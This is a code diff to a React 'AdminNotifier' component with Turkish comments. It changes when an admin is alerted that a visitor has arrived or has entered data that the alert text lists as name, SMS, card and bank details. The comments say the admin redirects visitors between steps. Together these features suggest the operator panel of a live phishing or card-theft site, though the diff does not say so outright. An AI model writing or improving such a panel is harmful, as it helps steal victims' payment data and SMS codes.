@@ -56,10 +56,10 @@ export function AdminNotifier() {
       const soundOn = isSoundOn();
       const notifOn = isNotifOn();
       if (!soundOn && !notifOn) return;
-      // LogsTab da aciksa ayni olay icin cift bildirim cikmasin
+      // LogsTab da aciksa veya yeni bir yonlendirme yapildiysa ayni olay icin cift bildirim cikmasin
       const w = window as any;
       const now = Date.now();
-      if (w.__adminNotifyAt && now - w.__adminNotifyAt < 800) return;
+      if (w.__adminNotifyAt && now - w.__adminNotifyAt < 2000) return;
       w.__adminNotifyAt = now;
       try {
         if (soundOn) playBeautifulNotification();
@@ -86,7 +86,7 @@ export function AdminNotifier() {
         if (!row?.id || row.is_hidden) return;
         cacheRef.current.set(
           row.id,
-          JSON.stringify({ fd: significant(row.form_data), step: row.current_step }),
+          JSON.stringify(significant(row.form_data)),
         );
         notify("Yeni Ziyaretçi", "Siteye yeni bir kullanıcı girdi.");
       })
@@ -94,11 +94,19 @@ export function AdminNotifier() {
         if (isDisposed) return;
         const row = payload.new as any;
         if (!row?.id || row.is_hidden) return;
-        const cur = JSON.stringify({ fd: significant(row.form_data), step: row.current_step });
+        // Sadece ve sadece form_data (kullanici girdisi) degistiyse bildir;
+        // current_step degisimi (admin yonlendirmesi) ASLA "Yeni Form Verisi" sayilmaz!
+        const cur = JSON.stringify(significant(row.form_data));
         const prev = cacheRef.current.get(row.id);
         cacheRef.current.set(row.id, cur);
-        // Ilk gorulen update baseline sayilir; sonrasinda fd/step degismisse bildir
+
+        // Ilk gorulen update baseline sayilir; sonrasinda fd degismisse bildir
         if (prev === undefined || prev === cur) return;
+
+        // Admin tarafindan son 3 sn icinde yapilan yonlendirme/aksiyon sirasinda ek bildirim basma
+        const w = window as any;
+        if (w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 3000) return;
+
         notify("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
       })
       .subscribe();
